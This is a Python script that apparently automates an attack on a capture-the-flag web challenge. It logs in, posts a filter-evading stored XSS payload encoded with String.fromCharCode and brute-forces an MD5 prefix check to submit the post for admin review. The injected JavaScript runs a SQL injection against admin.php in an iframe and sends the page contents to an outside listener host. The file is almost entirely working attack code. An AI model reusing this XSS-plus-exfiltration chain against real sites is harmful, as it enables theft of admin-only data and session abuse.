#coding:utf-8
from urllib import unquote
import base64
import sys
import hashlib
import requests
import re

def getPayload(evaljs):
	payload='<svg><script>eval&#40String.fromCharCode&#40 '
	for i in range(len(evaljs)):
		payload+=str(ord(evaljs[i]))
		if(i+1<len(evaljs)):
			payload+=','
	payload+='&#41&#41;'
	payload+="</script>"
	print("[payload] "+payload)
	return payload

def decode(data):
	s = base64.b64decode(data)
	s = unquote(s)
	print(s)


def md5(s):
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

def md5crack(strs):
    for i in range(100000,100000000):
        a = md5(i)
        if a[0:6] == strs:
            print(i)
            return str(i)

def autoCrack(ip,port):

	url="http://"+ip+":"+str(port)

	evaljs='var iframe=document.createElement("iframe");iframe.src="/admin.php?id=-999 union select 1,2,flagg from flag";document.body.appendChild(iframe);iframe.onload=setInterval(function(){var c=encodeURI(document.getElementsByTagName("iframe")[0].contentWindow.document.getElementsByTagName("body")[0].innerHTML);window.location.href="http://'+xssListener+'?flag="+btoa(c)},1000);'
	
	r = requests.session()
	loginData={
		"username":"abcd",
		"password":"123444"
	}
	r.post(url+"/login.php",data=loginData)


	postData={
		"post":getPayload(evaljs)
	}
	rtext = r.post(url+"/post.php",data=postData)

	code = re.search( r"src='\./post/(.+)\.html", rtext.text, re.M|re.I).group(1)
	print("[code] "+code)

	urlBug = url+"/post/"+code+".html"

	rtext = r.get(url+"/commitbug.php")

	crackCode = re.search( r"===....([a-f0-9]{6})", rtext.content, re.M|re.I).group(1)
	print("[crackCode] "+crackCode)
	print("[+] cracking....")
	check = md5crack(crackCode)
	print("[check] " + check)
	bugData={
		"bug":urlBug,
		"check":check,
	}
	rtext = r.post(url+"/commitbug.php",data=bugData)
	if("成功发送" in rtext.content):
		print("[+] The response is send to your xssListener,Please check.")
	else:
		print("[-] Something error!")






if __name__ == '__main__':
	# evaljs='var iframe=document.createElement("iframe");iframe.src="/admin.php?id=-999 union select 1,2,flagg from flag";document.body.appendChild(iframe);iframe.onload=setInterval(function(){var c=encodeURI(document.getElementsByTagName("iframe")[0].contentWindow.document.getElementsByTagName("body")[0].innerHTML);window.location.href="http://xssListener?flag="+btoa(c)},1000);'

	# xss监听服务器地址
	xssListener="xssListenerEval.com"

	mode = sys.argv[1]
	arg = sys.argv[2]
	if(mode =="decode"):
		decode(arg)
	elif(mode == "payload"):
		getPayload(arg)
	elif(mode =="md5"):
		md5crack(arg)
	elif(mode == "auto"):
		ip = arg.split(":")[0]
		port = arg.split(":")[1]
		autoCrack(ip,port)
	


# data="JTBBJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3M9JTIyY29udGFpbmVyJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3M9JTIyaGVhZGVyJTIwY2xlYXJmaXglMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NuYXYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0N1bCUyMGNsYXNzPSUyMm5hdiUyMG5hdi1waWxscyUyMHB1bGwtcmlnaHQlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUyMHJvbGU9JTIycHJlc2VudGF0aW9uJTIyJTNFJTNDYSUyMGhyZWY9JTIyLyUyMiUzRSVFNCVCOCVCQiVFOSVBMSVCNSUzQy9hJTNFJTNDL2xpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjByb2xlPSUyMnByZXNlbnRhdGlvbiUyMiUzRSUzQ2ElMjBocmVmPSUyMnBvc3QucGhwJTIyJTNFJUU2JThBJTk1JUU3JUE4JUJGJTNDL2ElM0UlM0MvbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUyMHJvbGU9JTIycHJlc2VudGF0aW9uJTIyJTNFJTNDYSUyMGhyZWY9JTIyY29tbWl0YnVnLnBocCUyMiUzRSVFNSU4RiU4RCVFOSVBNiU4OCUzQy9hJTNFJTNDL2xpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjByb2xlPSUyMnByZXNlbnRhdGlvbiUyMiUzRSUzQ2ElMjBocmVmPSUyMmFib3V0LnBocCUyMiUzRSVFNSU4NSVCMyVFNCVCQSU4RSVFNiU4OCU5MSUzQy9hJTNFJTNDL2xpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjByb2xlPSUyMnByZXNlbnRhdGlvbiUyMiUzRSUzQ2ElMjBocmVmPSUyMmFkbWluLnBocCUyMiUzRSVFNyVBRSVBMSVFNyU5MCU4NiVFOSU5RCVBMiVFNiU5RCVCRiUzQy9hJTNFJTNDL2xpJTNFJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDL3VsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDL25hdiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2gzJTIwY2xhc3M9JTIydGV4dC1tdXRlZCUyMiUzRSVFNiU5NiU4NyVFNyVBQiVBMCVFNyVCMiVCRSVFOSU4MCU4OSUzQy9oMyUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQy9kaXYlM0UlMEElMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0Nmb3JtJTIwbWV0aG9kPSUyMkdFVCUyMiUyMHJvbGU9JTIyZm9ybSUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzPSUyMmZvcm0tZ3JvdXAlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsYWJlbCUzRSVFOCVBRiVCNyVFOCVCRSU5MyVFNSU4NSVBNSVFOCVBNiU4MSVFNiU5RiVBNSVFOCVBRiVBMiVFNyU5NCVBOCVFNiU4OCVCNyVFNyU5QSU4NGlkJTNDL2xhYmVsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3M9JTIyaW5wdXQtZ3JvdXAlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcz0lMjJpbnB1dC1ncm91cC1hZGRvbiUyMiUzRSVFNyU5NCVBOCVFNiU4OCVCN0lEJTNDL2RpdiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2lucHV0JTIwY2xhc3M9JTIyZm9ybS1jb250cm9sJTIyJTIwdHlwZT0lMjJ0ZXh0JTIyJTIwbmFtZT0lMjJpZCUyMiUyMHBsYWNlaG9sZGVyPSUyMiVFOCVBRiVCNyVFOCVCRSU5MyVFNSU4NSVBNUlEJUUzJTgwJTgyJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDL2RpdiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQy9kaXYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NidXR0b24lMjB0eXBlPSUyMnN1Ym1pdCUyMiUyMGNsYXNzPSUyMmJ0biUyMGJ0bi1kZWZhdWx0JTIyJTNFJUU2JTlGJUE1JUU4JUFGJUEyJTNDL2J1dHRvbiUzRSUwQSUyMCUyMCUyMCUyMCUzQy9mb3JtJTNFJTNDYnIlM0UlM0NkaXYlMjBjbGFzcz0lMjJhbGVydCUyMGFsZXJ0LXN1Y2Nlc3MlMjIlM0UlM0NhJTIwY2xhc3M9JTIyY2xvc2UlMjIlMjBkYXRhLWRpc21pc3M9JTIyYWxlcnQlMjIlM0UlQzMlOTclMjAlMjAlMjAlM0MvYSUzRSUzQ3N0cm9uZyUzRSVFNiU4RiU5MCVFNyVBNCVCQTolM0Mvc3Ryb25nJTNFJTNDYnIlM0UlRTQlQkQlQTAlRTYlOUYlQTUlRTglQUYlQTIlRTclOUElODQlRTclOTQlQTglRTYlODglQjclRTYlOTglQUYlRUYlQkMlOUEyJTIwOiUyMGZsYWclN0J1dWlkJTdEJTNDL2RpdiUzRSUwQSUyMCUyMCUyMCUyMCUzQy9kaXYlM0UlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmM9JTIyL3N0YXRpYy9qcy9qcXVlcnkubWluLmpzJTIyJTNFJTNDL3NjcmlwdCUzRSUwQSUzQ3NjcmlwdCUyMHNyYz0lMjIvc3RhdGljL2pzL2Jvb3RzdHJhcC5qcyUyMiUzRSUzQy9zY3JpcHQlM0UlMEElM0NzY3JpcHQlMjBzcmM9JTIyL3N0YXRpYy9qcy9tYWluLmpzJTIyJTNFJTNDL3NjcmlwdCUzRSUwQSUwQQ=="
# decode(data)